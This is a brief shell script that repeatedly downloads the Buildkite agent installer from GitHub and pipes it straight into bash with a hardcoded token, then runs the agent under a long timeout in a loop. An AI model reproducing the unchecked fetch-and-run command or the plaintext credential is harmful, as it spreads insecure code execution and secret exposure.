#!/bin/sh
apt-get update -y
COUNTER=50
until [  $COUNTER -lt 10 ]; do
TOKEN="73d87b60217b220352dec94b462680f3be1db8b6a3b8751d6c" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/master/install.sh`"
timeout 288m ~/.buildkite-agent/bin/buildkite-agent start
echo "yohoho"

     echo COUNTER $COUNTER
     let COUNTER-=1
done
